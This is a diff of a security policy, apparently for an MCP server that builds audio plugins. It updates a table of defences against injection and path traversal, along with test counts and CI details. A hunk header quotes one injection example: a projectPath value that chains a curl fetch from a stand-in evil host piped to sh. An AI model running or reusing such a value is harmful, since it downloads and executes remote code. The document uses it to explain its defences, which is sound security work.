@@ -52,10 +52,10 @@ projectPath="https://evil.com/payload; curl http://evil/pwn.sh | sh"
 |-------|---------------|-----|
 | **1. zod schema & template escaping** — `index.js:40–60`, escaping at `:650–664`, single-pass substitution at `:587` | Invalid characters in `target`, `generator`, `options`, `testName`, `name`, `vendor`, `description`, `formats`, `projectPath`; C++/CMake/Turtle string breakout | Per-parameter regexes (`SAFE_TARGET`, `SAFE_PLUGIN_NAME`, `SAFE_GENERATOR`, `SAFE_OPTIONS`, `SAFE_PATH`, …) plus `RESERVED_CMAKE_TARGETS` (`:48`) reject invalid inputs up front, and `description` is escaped specifically for C++, CMake, and LV2 Turtle literals in a single non-recursive substitution pass. |
 | **2. `spawnSync` with argument arrays** — `index.js:180`, wrapper at `:193` | All shell injection, regardless of input | No shell is ever involved. User values become separate `argv[]` entries, so `;`, `` ` ``, `$()`, `\|` are literal characters. There is no `execSync` and no `sh -c` in the codebase (the only mention is a comment explaining why), and `eslint.config.js` **fails the build** if `exec` or `execSync` is imported — so this invariant is machine-enforced, not just a convention. |
-| **3. `assertWithinProject()` — the boundary guard** — `index.js:79`, with `hasDotDot` at `:70` | Path and symlink traversal out of the project root | Operates on **fully resolved absolute** paths AND resolves existing path ancestors with **`fs.realpathSync()`** against the real project root, so neither `..` segments, absolute paths, nor symlinks inside the project pointing outside it can escape containment. Shared across `audio_plugin_lint` (`target` + non-symlink directory walk), `checkPluginPath()` (`index.js:699`) in `audio_plugin_create`, `audio_plugin_plugins`, `audio_plugin_build`, `audio_plugin_configure`, `audio_plugin_test`, and `audio_plugin_validate`. |
+| **3. `assertWithinProject()` — the boundary guard** — `index.js:80`, with `hasDotDot` at `:71` | Path and symlink traversal out of the project root | Operates on **fully resolved absolute** paths AND resolves existing path ancestors with **`fs.realpathSync()`** against the real project root, so neither `..` segments, absolute paths, nor symlinks inside the project pointing outside it can escape containment. Shared across `audio_plugin_lint` (`target` + non-symlink directory walk), `checkPluginPath()` + root `CMakeLists.txt` guard in `audio_plugin_create`, `audio_plugin_plugins` (`pluginsDir` + `status.json`), `audio_plugin_build`, `audio_plugin_configure`, `audio_plugin_test`, and `audio_plugin_validate`. |
 | **3b. Config validation** — `CONFIG_SCHEMA` at `index.js:250`, `loadProjectConfig()` at `:263` | A hostile `apc-mcp.json` | `loadProjectConfig()` validates **each key independently** against `CONFIG_SCHEMA`, so one bad value degrades to its default instead of being spread blindly over the defaults. `buildDir`/`pluginsDir` must be relative and free of `..`; `validateFormats` must be an array of known formats; unknown keys are ignored. |
 | **4. Command whitelist** *(with one documented exception)* — every `trySpawn()` call site | Arbitrary binary execution | `trySpawn()` is called with hardcoded names — `cmake`, `ctest`, `clang-format` — never with a user-supplied command. **Exception:** `audio_plugin_validate` takes its validator binary from `validateCommand` / `clapValidatorCommand` in `apc-mcp.json`. Those are constrained to `SAFE_TARGET` (`[a-zA-Z0-9_.-]+`), which contains **no path separator**, so they name a binary to be resolved via `PATH` rather than a path to execute. See residual risk. |
-| **5. `maxBuffer` + timeouts** — `index.js:182–184` and the per-call `timeout:` values | Memory exhaustion from large output | 2 MB output cap; 180 s default timeout, tightened per command (60–120 s for lint/validate, 300 s for ctest). A timeout is reported as a timeout, not as a null exit code. |
+| **5. `maxBuffer` + timeouts** — `index.js:183–185` and the per-call `timeout:` values | Memory exhaustion from large output | 2 MB output cap; 180 s default timeout, tuned per command (60–120 s for lint/configure/validate, 300 s for ctest, 600 s for cold JUCE builds). A timeout is reported as a timeout, not as a null exit code. |
 | **6. Binary discovery without a subprocess** — `binaryOnPath()` at `index.js:128` | Injection via `which` | `binaryOnPath()` scans `PATH` with `fs.accessSync` rather than shelling out to `which`, so prerequisite checking cannot itself be an injection vector — and a missing tool is actually reported as missing. |
 | **7. Honest failure reporting** — `registerTool()` at `index.js:713`, `isError` set at `:721` and throughout | Acting on a false premise | A tool whose underlying command failed returns `isError: true`, including cases where the command exited 0 but emitted compiler errors, failed CTest cases, and validation that could not complete because a validator was missing. This is a security property, not just UX: a model told "No formatting issues" after a failed in-place rewrite will keep going. |
 | **8. Dependency license gate** — `scripts/check-licenses.mjs` | Supply-chain policy drift | `npm run licenses` parses full SPDX expressions (`WITH` > `AND` > `OR` + parentheses) for every package in `package-lock.json` against `license_decisions.yml`; a production dependency outside it fails CI. |
@@ -104,9 +104,9 @@ write outside the project root.**
 - Dependency license gate added and wired into CI
 - Broken GitLab CI removed; CI consolidated on GitHub Actions with all actions
   pinned to commit SHAs and explicit job `permissions` / `timeout-minutes`
-- **189 tests**, including 39 negative security tests, 61 template-structure
-  tests, 15 artefact-discovery tests, 12 real C/C++ compile checks, 27 tool-output
-  tests, 21 release/CI-invariant tests, and 14 server/CLI tests
+- **215 tests**, including 45 negative security tests, 64 template-structure
+  tests, 15 artefact-discovery tests, 20 real C/C++ compile + link checks, 34 tool-output
+  tests, 22 release/CI-invariant tests, and 15 server/CLI tests
 
 ### 1.5.0 / 1.4.0
 
@@ -130,7 +130,7 @@ See the upgrade notice above — these versions are vulnerable to SEC-01.
   header or script ships
 - `engines.node`: `>=22` (Node 18 and 20 are both end of life)
 - Automated scanning: Dependabot + CodeQL on push/PR, `npm audit
-  --audit-level=high`, the scaffold smoke test, real CMake configure jobs (`clap`,
+  --audit-level=high`, the scaffold smoke test, real CMake compile+link jobs (`clap`,
   `lv2`, `juce`), ESLint, and the license gate in GitHub Actions.
   `npm run check` runs the local gate chain and is required by `scripts/ship.mjs`
   before tagging a release.
